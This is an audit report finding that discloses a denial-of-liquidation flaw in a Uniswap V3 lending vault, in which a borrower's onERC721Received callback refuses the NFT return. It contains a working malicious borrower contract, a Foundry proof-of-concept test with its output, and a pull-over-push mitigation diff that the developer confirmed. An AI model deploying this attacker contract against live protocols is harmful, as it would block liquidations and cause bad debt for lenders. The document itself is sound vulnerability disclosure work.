@@ -1,0 +1,26 @@
+[H-06] Owner of a position can prevent liquidation due to theonERC721Receivedcallback
+Submitted by0xjuan, also found byCaeraDenoir,kinda_very_good,falconhoof,0x175,Arz,JohnSmith,alix40,stackachu,givn,wangxx2026,Ocean_Sky,0xloscar01,SpicyMeatball,0xAlix2,Ali-_-Y,0rpse,iamandreiski,0xBugSlayer,nmirchev8,nnez,ayden, andnovamanbg
+When liquidating a position,_cleanUpLoan()is called on the loan. This attempts to send the uniswap LP position back to the user via the following line:
+nonfungiblePositionManager.safeTransferFrom(address(this),owner,tokenId);
+ThissafeTransferFromfunction call invokes theonERC721Receivedfunction on the owner’s contract. The transaction will only succeed if the owner’s contract returns the function selector of the standardonERC721Receivedfunction. However, the owner can design the function to return an invalid value, and this would lead to thesafeTransferFromreverting, thus being unable to liquidate the user.
+Impact
+This leads to bad debt accrual in the protocol which cannot be prevented, and eventually insolvency.
+Proof of Concept
+Below is a foundry test that proves this vulnerability. To run the PoC:
+Copy the attacker contract intotest/integration/V3Vault.t.sol.In the same file, copy the contents of the ‘foundry test’ dropdown into theV3VaultIntegrationTestcontract.In the terminal, enterforge test --via-ir --mt test_preventLiquidation -vv.
+Attacker Contract:
+contractMaliciousBorrower{addresspublicvault;constructor(address_vault) {vault=_vault;}functiononERC721Received(addressoperator,addressfrom,uint256tokenId,bytescalldatadata)externalreturns(bytes4) {// Does not accept ERC721 tokens from the vault. This causes liquidation to revertif(from==vault)returnbytes4(0xdeadbeef);elsereturnmsg.sig;}}
+Foundry test:
+functiontest_preventLiquidation()external{// Create malicious borrower, and setup a loanaddressmaliciousBorrower=address(newMaliciousBorrower(address(vault)));custom_setupBasicLoan(true,maliciousBorrower);// assert: debt is equal to collateral value, so position is not liquidatable(uint256debt,,uint256collateralValue,uint256liquidationCost,uint256liquidationValue) =vault.loanInfo(TEST_NFT);assertEq(debt,collateralValue);// collateral DAI value change -100%vm.mockCall(CHAINLINK_DAI_USD,abi.encodeWithSelector(AggregatorV3Interface.latestRoundData.selector),abi.encode(uint80(0),int256(0),block.timestamp,block.timestamp,uint80(0)));// ignore differenceoracle.setMaxPoolPriceDifference(10001);// assert that debt is greater than collateral value (position is liquidatable now)(debt, ,collateralValue,liquidationCost,liquidationValue) =vault.loanInfo(TEST_NFT);assertGt(debt,collateralValue);(uint256debtShares) =vault.loans(TEST_NFT);vm.startPrank(WHALE_ACCOUNT);USDC.approve(address(vault),liquidationCost);// This fails due to malicious owner. So under-collateralised position can't be liquidated. DoS!vm.expectRevert("ERC721: transfer to non ERC721Receiver implementer");vault.liquidate(IVault.LiquidateParams(TEST_NFT,debtShares,0,0,WHALE_ACCOUNT,""));}functioncustom_setupBasicLoan(boolborrowMax,addressborrower)internal{// lend 10 USDC_deposit(10000000,WHALE_ACCOUNT);// Send the test NFT to borrower accountvm.prank(TEST_NFT_ACCOUNT);NPM.transferFrom(TEST_NFT_ACCOUNT,borrower,TEST_NFT);uint256tokenId=TEST_NFT;// borrower adds collateralvm.startPrank(borrower);NPM.approve(address(vault),tokenId);vault.create(tokenId,borrower);(,,uint256collateralValue,,) =vault.loanInfo(tokenId);// borrower borrows assets, backed by their univ3 positionif(borrowMax) {// borrow maxvault.borrow(tokenId,collateralValue);}vm.stopPrank();}
+Terminal output:
+Ran 1 test for test/integration/V3Vault.t.sol:V3VaultIntegrationTest[PASS] test_preventLiquidation() (gas: 1765928)Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 473.56ms
+Recommended Mitigation Steps
+One solution would be to approve the NFT to the owner and provide a way (via the front-end or another contract) for them to redeem the NFT back later on. This is a “pull over push” approach and ensures that the liquidation will occur.
+Example:
+function _cleanupLoan(uint256 tokenId, uint256 debtExchangeRateX96, uint256 lendExchangeRateX96, address owner)internal{_removeTokenFromOwner(owner, tokenId);_updateAndCheckCollateral(tokenId, debtExchangeRateX96, lendExchangeRateX96, loans[tokenId].debtShares, 0);delete loans[tokenId];-        nonfungiblePositionManager.safeTransferFrom(address(this), owner, tokenId);+       nonfungiblePositionManager.approve(owner, tokenId);emit Remove(tokenId, owner);}
+Assessed type
+DoS
+kalinbas (Revert) confirmed
+Revert mitigated:
+PRshereandhere- removed sending of NFT to avoid reentrancy.
+Status:Mitigation confirmed. Full details in reports fromthank_you,ktgandb0g0.
